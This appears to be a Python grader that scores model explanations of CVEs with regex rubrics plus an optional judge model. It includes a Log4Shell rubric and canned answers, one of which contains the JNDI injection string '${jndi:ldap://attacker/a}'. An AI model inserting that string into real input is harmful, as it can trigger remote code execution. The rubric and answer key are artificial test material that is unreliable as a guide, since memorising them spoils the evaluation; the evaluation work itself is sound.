"""Tier-3 rubric judge for sandboxcli - for probes with NO executable ground truth
(CVE-explain, remediation/reporting prose). Deterministic-first, model-second.

Design (approved: option a + judge-on-fail-only):

  LAYER 1 - primary, deterministic, NO model. Each probe carries a HUMAN-AUTHORED
    rubric: a set of REQUIRED factual-claim items (each matched by canonical regex
    markers) PLUS a set of MUST-NOT-CLAIM distractors that catch hallucination /
    confabulation. The Layer-1 score is:
        facts_present / facts_required          (a distractor hit forces fail)
    Reproducible, version-controlled, publishable. THIS is the score.

  LAYER 2 - judge model, ONLY invoked on a FAILED Layer-1 gate. A LOCAL judge
    (216/.28, never localhost, never paid by default) receives the SAME fixed rubric
    and returns strict JSON {item_id: bool}. It can NEVER turn a fail into a pass -
    it only FLAGS the failed items for HUMAN REVIEW (per the operator hard rule:
    a failed gate is "review this", not "reject"). Publish judge-vs-human agreement.

  SCORER_CONTRACT - a canned (good, bad) answer pair per rubric; the good answer must
    PASS Layer-1 and the bad answer must FAIL, so the rubric can't silently break
    (always-pass / always-fail). Mirrors probes_lean.SCORER_CONTRACT. Enforced by
    test_sandbox_score.py and by score_selftest() at import-check time.

No network / no model is touched by Layer 1; Layer 2 is opt-in and isolated.
"""
from __future__ import annotations

import re
from dataclasses import dataclass, field
from typing import Callable


# --------------------------------------------------------------------------- rubric model
@dataclass(frozen=True)
class Fact:
    """One required factual claim. `markers` are regexes (case-insensitive, DOTALL);
    ANY marker matching counts the fact as present. `id` is stable + published."""
    id: str
    desc: str
    markers: tuple[str, ...]


@dataclass(frozen=True)
class Distractor:
    """A must-NOT-claim: a hallucination/confabulation signature. If ANY marker
    matches, the answer is a hard FAIL regardless of facts present."""
    id: str
    desc: str
    markers: tuple[str, ...]


@dataclass(frozen=True)
class Rubric:
    task: str
    domain: str
    prompt: str
    facts: tuple[Fact, ...]
    distractors: tuple[Distractor, ...] = ()
    pass_ratio: float = 1.0            # required facts_present/facts_required to pass
    # SCORER_CONTRACT: (passing_answer, failing_answer)
    contract: tuple[str, str] = ("", "")


def _hit(markers, text) -> bool:
    return any(re.search(m, text, re.I | re.S) for m in markers)


# --------------------------------------------------------------------------- Layer 1
def score_layer1(rubric: Rubric, answer: str) -> dict:
    """Deterministic rubric score. Never raises. Returns:
        {passed, score, facts_required, facts_present, missing[], distractor_hits[],
         per_fact{id:bool}, layer:'1'}
    A distractor hit forces passed=False even at full fact coverage."""
    text = answer or ""
    per_fact = {f.id: _hit(f.markers, text) for f in rubric.facts}
    present = [fid for fid, ok in per_fact.items() if ok]
    missing = [fid for fid, ok in per_fact.items() if not ok]
    dhits = [d.id for d in rubric.distractors if _hit(d.markers, text)]

    required = len(rubric.facts)
    score = (len(present) / required) if required else 0.0
    passed = (score >= rubric.pass_ratio) and not dhits
    return {
        "layer": "1",
        "passed": passed,
        "score": round(score, 4),
        "facts_required": required,
        "facts_present": len(present),
        "missing": missing,
        "distractor_hits": dhits,
        "per_fact": per_fact,
    }


# --------------------------------------------------------------------------- Layer 2
_JUDGE_SYS = (
    "You are a strict factual grader for a security-knowledge answer. You are given a "
    "fixed rubric of factual items and an answer. For EACH item, decide if the answer "
    "correctly and explicitly makes that claim. Judge ONLY the listed items. Do not "
    "reward confident-sounding prose. Return STRICT JSON: an object mapping each item "
    "id to true or false, plus an optional \"notes\" string. No other text."
)


def build_judge_prompt(rubric: Rubric, answer: str) -> str:
    lines = [f"PROBE: {rubric.task}", "RUBRIC ITEMS (id: what must be claimed):"]
    for f in rubric.facts:
        lines.append(f"  {f.id}: {f.desc}")
    if rubric.distractors:
        lines.append("MUST-NOT-CLAIM (if the answer asserts any of these it is wrong):")
        for d in rubric.distractors:
            lines.append(f"  {d.id}: {d.desc}")
    lines.append("\nANSWER:\n" + (answer or "")[:6000])
    lines.append('\nReturn JSON like {"F1": true, "F2": false, "notes": "..."}.')
    return "\n".join(lines)


def score_layer2(rubric: Rubric, answer: str, *, host: str, model: str,
                 ask: Callable | None = None) -> dict:
    """Judge-model pass. ONLY meaningful on a failed Layer-1 gate. NEVER flips a fail
    to a pass: it returns judge opinion + a REVIEW flag for humans. `ask(host, model,
    system, prompt)->str` is injected (defaults to the sandbox_run agent path) so this
    is unit-testable and so the local-only host rule stays enforced by the caller.
    Returns {layer:'2', judge_items{}, judge_notes, flagged_for_review:True, ...}."""
    import json as _json
    _reject_local_host(host)
    if ask is None:
        ask = _default_ask
    prompt = build_judge_prompt(rubric, answer)
    out = {"layer": "2", "host": host, "model": model,
           "flagged_for_review": True, "judge_items": {}, "judge_notes": None,
           "judge_error": None, "can_override_layer1": False}
    try:
        raw = ask(host, model, _JUDGE_SYS, prompt)
        data = _extract_json(raw)
        items = {f.id: bool(data.get(f.id, False)) for f in rubric.facts}
        out["judge_items"] = items
        out["judge_notes"] = data.get("notes")
        out["judge_facts_present"] = sum(items.values())
        out["judge_disagrees_with_fail"] = all(items.values()) if items else False
    except Exception as e:                                   # noqa - never raise
        out["judge_error"] = f"{type(e).__name__}: {e}"
    return out


def _reject_local_host(host: str):
    """Mirror sandbox_run's hard rule: never run inference on localhost."""
    h = (host or "").lower()
    if any(x in h for x in ("localhost", "127.0.0.1", "0.0.0.0", "::1")):
        raise ValueError(f"refusing local inference host for judge: {host!r}")


def _default_ask(host, model, system, prompt) -> str:
    # Lazy import so Layer-1 and tests need nothing from the agent stack.
    from sandbox_run import _ask_model
    answer, _ = _ask_model(host, model, f"{system}\n\n{prompt}", think=False, cap=1)
    return answer


_JSON_RE = re.compile(r"\{.*\}", re.S)


def _extract_json(raw: str) -> dict:
    import json as _json
    m = _JSON_RE.search(raw or "")
    if not m:
        raise ValueError("no JSON object in judge output")
    return _json.loads(m.group(0))


# --------------------------------------------------------------------------- top-level
def score(rubric: Rubric, answer: str, *, judge_host: str | None = None,
          judge_model: str | None = None, ask: Callable | None = None) -> dict:
    """Full Tier-3 score. Layer 1 is authoritative. Layer 2 runs ONLY when Layer 1
    fails AND a judge host+model are supplied; it never changes the verdict, only
    attaches review context. Result verdict is ALWAYS Layer 1's `passed`."""
    l1 = score_layer1(rubric, answer)
    result = {"task": rubric.task, "domain": rubric.domain,
              "passed": l1["passed"], "layer1": l1, "layer2": None,
              "flagged_for_review": not l1["passed"]}
    if not l1["passed"] and judge_host and judge_model:
        result["layer2"] = score_layer2(rubric, answer, host=judge_host,
                                         model=judge_model, ask=ask)
    return result


# --------------------------------------------------------------------------- self-test
def score_selftest(rubrics: dict[str, Rubric] | None = None) -> list[str]:
    """SCORER_CONTRACT check: for every rubric, its canned passing answer must score
    Layer-1 passed=True and its failing answer passed=False. Returns a list of failure
    strings (empty == all good). No model involved."""
    if rubrics is None:
        rubrics = RUBRICS
    problems = []
    for name, r in rubrics.items():
        good, bad = r.contract
        if not good or not bad:
            problems.append(f"{name}: missing SCORER_CONTRACT (good/bad answer)")
            continue
        if not score_layer1(r, good)["passed"]:
            problems.append(f"{name}: canned PASSING answer did not pass Layer-1")
        if score_layer1(r, bad)["passed"]:
            problems.append(f"{name}: canned FAILING answer passed Layer-1")
    return problems


# --------------------------------------------------------------------------- rubrics
# Human-authored. Each fact has multiple markers so paraphrase doesn't unfairly fail;
# distractors catch the specific confabulations this model class tends to emit.

RUBRICS: dict[str, Rubric] = {
    "CVE_LOG4SHELL": Rubric(
        task="CVE_LOG4SHELL",
        domain="cve-explain",
        prompt=("Authorized security review. Explain CVE-2021-44228 (Log4Shell): what "
                "component is vulnerable, the mechanism of exploitation, and the "
                "primary remediation. Be specific and factual."),
        facts=(
            Fact("F_LIB", "names Apache Log4j (2.x) as the vulnerable library",
                 (r"log4j", r"log4j\s*2")),
            Fact("F_JNDI", "identifies JNDI lookup as the mechanism",
                 (r"\bjndi\b",)),
            Fact("F_LDAP", "notes LDAP/RMI remote class/URL loading",
                 (r"\bldap\b", r"\brmi\b", r"\bdns\b")),
            Fact("F_RCE", "states the impact is remote code execution",
                 (r"remote code execution", r"\brce\b", r"arbitrary code")),
            Fact("F_PAYLOAD", "shows the ${jndi:...} lookup trigger form",
                 (r"\$\{jndi:", r"jndi:ldap")),
            Fact("F_FIX", "gives a real remediation: upgrade Log4j 2.17+ / disable lookups",
                 (r"2\.1[567]", r"upgrade", r"log4j2\.formatMsgNoLookups",
                  r"disable\s+lookups?", r"remove.*JndiLookup")),
        ),
        distractors=(
            Distractor("D_HEARTBLEED", "confabulates it as a memory/buffer/OpenSSL bug",
                       (r"heartbleed", r"buffer overflow", r"openssl", r"memory leak")),
            Distractor("D_SQLI", "confabulates it as SQL injection",
                       (r"sql injection", r"\bsqli\b")),
            Distractor("D_YEAR", "misstates the year as 2014/2017/2019",
                       (r"20(14|17|19)\b.*log4|log4.*20(14|17|19)\b",)),
        ),
        pass_ratio=0.8,
        contract=(
            # PASSING canned answer
            "CVE-2021-44228, Log4Shell, is a flaw in the Apache Log4j 2 logging library. "
            "When a logged string contains a JNDI lookup such as ${jndi:ldap://attacker/a}, "
            "Log4j resolves it via JNDI over LDAP or RMI and loads a remote class, giving "
            "remote code execution (RCE). Remediation: upgrade Log4j to 2.17.1 or later and "
            "disable message lookups.",
            # FAILING canned answer (confident but wrong: says it's a buffer overflow)
            "CVE-2021-44228 is a buffer overflow in OpenSSL's heartbeat handler, similar to "
            "Heartbleed, that leaks memory. Patch OpenSSL to fix it.",
        ),
    ),
}
